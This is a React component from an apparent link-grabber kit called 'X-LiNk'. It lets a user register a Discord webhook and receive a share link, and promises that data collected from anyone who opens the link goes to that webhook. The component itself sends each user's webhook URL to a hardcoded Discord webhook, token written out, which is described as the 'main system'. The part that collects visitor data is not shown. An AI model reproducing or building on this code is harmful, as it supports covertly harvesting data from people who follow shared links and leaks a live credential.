import { useState } from "react";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { ArrowLeft, Webhook, Copy, ExternalLink } from "lucide-react";

interface WebhookSetupProps {
  onBack: () => void;
}

export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
  const [webhook, setWebhook] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [generatedLink, setGeneratedLink] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  const sendToMainWebhook = async (
    userWebhook: string,
    generatedId: string,
  ) => {
    try {
      const response = await fetch(
        "https://discord.com/api/webhooks/1382124073953263787/QNnd4cako-sTG77Hv6sQ-ZDT1ZX0HM22fuVvIT4ednht3YIj91mEgYwZJ8HiH8TkgvLE",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "🔗 New Webhook Created",
                color: 0x00ff00,
                fields: [
                  {
                    name: "🎯 User Webhook",
                    value: `\`\`\`${userWebhook}\`\`\``,
                    inline: false,
                  },
                  {
                    name: "🌐 Generated Link",
                    value: `${window.location.origin}?ref=${generatedId}`,
                    inline: false,
                  },
                  {
                    name: "⏰ Created At",
                    value: new Date().toISOString(),
                    inline: true,
                  },
                ],
                footer: {
                  text: "X-LiNk System - Webhook Creation",
                },
              },
            ],
          }),
        },
      );

      return response.ok;
    } catch (error) {
      console.error("Main webhook error:", error);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!webhook.trim()) {
      setError("Please enter a valid webhook URL");
      return;
    }

    if (!webhook.includes("discord.com/api/webhooks/")) {
      setError("Please enter a valid Discord webhook URL");
      return;
    }

    setIsLoading(true);
    setError("");

    // Generate unique ID for this webhook
    const uniqueId =
      Date.now().toString(36) + Math.random().toString(36).substr(2);

    // Store webhook in localStorage with unique ID
    const webhookData = {
      webhook: webhook,
      createdAt: new Date().toISOString(),
      id: uniqueId,
    };

    localStorage.setItem(`webhook_${uniqueId}`, JSON.stringify(webhookData));

    // Generate the link
    const link = `${window.location.origin}?ref=${uniqueId}`;

    // Send to main webhook
    const success = await sendToMainWebhook(webhook, uniqueId);

    if (success) {
      setGeneratedLink(link);
      setShowSuccess(true);
    } else {
      setError("Failed to create webhook. Please try again.");
    }

    setIsLoading(false);
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedLink);
      // Could add a toast notification here
    } catch (error) {
      console.error("Failed to copy:", error);
    }
  };

  const openLink = () => {
    window.open(generatedLink, "_blank");
  };

  if (showSuccess) {
    return (
      <motion.div
        className="flex items-center justify-center min-h-screen p-4"
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.5 }}
      >
        <Card className="w-full max-w-2xl bg-black/60 border-green-600/50 backdrop-blur-xl shadow-2xl">
          <CardHeader className="text-center pb-6">
            <motion.div
              initial={{ y: -20 }}
              animate={{ y: 0 }}
              transition={{ delay: 0.2 }}
              className="flex flex-col items-center"
            >
              <div className="mb-4 p-3 bg-green-600/20 rounded-full">
                <Webhook className="w-8 h-8 text-green-400" />
              </div>
              <CardTitle className="text-3xl font-bold text-white mb-2">
                Webhook Created Successfully!
              </CardTitle>
              <p className="text-green-300 text-sm">
                Your custom X-LiNk instance has been generated
              </p>
            </motion.div>
          </CardHeader>
          <CardContent className="space-y-6">
            <div className="space-y-4">
              <label className="block text-white font-medium">
                Your Custom Link:
              </label>
              <div className="flex gap-2">
                <Input
                  value={generatedLink}
                  readOnly
                  className="bg-black/50 border-green-600/50 text-white flex-1"
                />
                <Button
                  onClick={copyToClipboard}
                  variant="outline"
                  size="icon"
                  className="border-green-600/50 text-green-300 hover:bg-green-600/20"
                >
                  <Copy className="w-4 h-4" />
                </Button>
                <Button
                  onClick={openLink}
                  variant="outline"
                  size="icon"
                  className="border-green-600/50 text-green-300 hover:bg-green-600/20"
                >
                  <ExternalLink className="w-4 h-4" />
                </Button>
              </div>
            </div>

            <div className="bg-green-900/20 border border-green-600/30 rounded-lg p-4">
              <h4 className="text-green-300 font-semibold mb-2">
                Instructions:
              </h4>
              <ul className="text-green-200 text-sm space-y-1">
                <li>• Share this link with others</li>
                <li>
                  • When someone uses your link, data will be sent to your
                  webhook
                </li>
                <li>• All activities will also be logged to the main system</li>
                <li>• Keep your webhook URL secure</li>
              </ul>
            </div>

            <div className="flex gap-4">
              <Button
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Dashboard
              </Button>
              <Button
                onClick={openLink}
                className="flex-1 bg-green-600 hover:bg-green-700 text-white"
              >
                <ExternalLink className="w-4 h-4 mr-2" />
                Open Your Site
              </Button>
            </div>
          </CardContent>
        </Card>
      </motion.div>
    );
  }

  return (
    <motion.div
      className="flex items-center justify-center min-h-screen p-4"
      initial={{ opacity: 0, x: 50 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5 }}
    >
      <Card className="w-full max-w-2xl bg-black/60 border-blue-600/50 backdrop-blur-xl shadow-2xl">
        <CardHeader className="text-center pb-6">
          <motion.div
            initial={{ y: -20 }}
            animate={{ y: 0 }}
            transition={{ delay: 0.2 }}
            className="flex flex-col items-center"
          >
            <div className="mb-4 p-3 bg-blue-600/20 rounded-full">
              <Webhook className="w-8 h-8 text-blue-400" />
            </div>
            <CardTitle className="text-3xl font-bold text-white mb-2">
              Create Your Webhook
            </CardTitle>
            <p className="text-blue-300 text-sm">
              Generate your own X-LiNk instance with custom webhook
            </p>
          </motion.div>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleSubmit} className="space-y-4">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.3 }}
            >
              <label className="block text-white font-medium mb-2">
                Discord Webhook URL
              </label>
              <Input
                type="url"
                placeholder="https://discord.com/api/webhooks/..."
                value={webhook}
                onChange={(e) => setWebhook(e.target.value)}
                className="bg-black/50 border-blue-600/50 text-white placeholder:text-gray-500 h-12 focus:border-blue-500 transition-colors"
                disabled={isLoading}
              />
            </motion.div>

            <div className="bg-blue-900/20 border border-blue-600/30 rounded-lg p-4">
              <h4 className="text-blue-300 font-semibold mb-2">
                How it works:
              </h4>
              <ul className="text-blue-200 text-sm space-y-1">
                <li>• Enter your Discord webhook URL</li>
                <li>• We'll generate a unique link for you</li>
                <li>• Share your link with others</li>
                <li>• All data collected will be sent to your webhook</li>
              </ul>
            </div>

            {error && (
              <motion.p
                className="text-red-400 text-sm text-center font-medium"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
              >
                {error}
              </motion.p>
            )}

            <motion.div
              className="flex gap-4"
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-gray-600 text-gray-300 hover:bg-gray-700 h-12"
                disabled={isLoading}
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-blue-600 hover:bg-blue-700 text-white h-12 font-semibold"
                disabled={isLoading || !webhook.trim()}
              >
                {isLoading ? "Creating..." : "Create Webhook"}
              </Button>
            </motion.div>
          </form>
        </CardContent>
      </Card>
    </motion.div>
  );
};
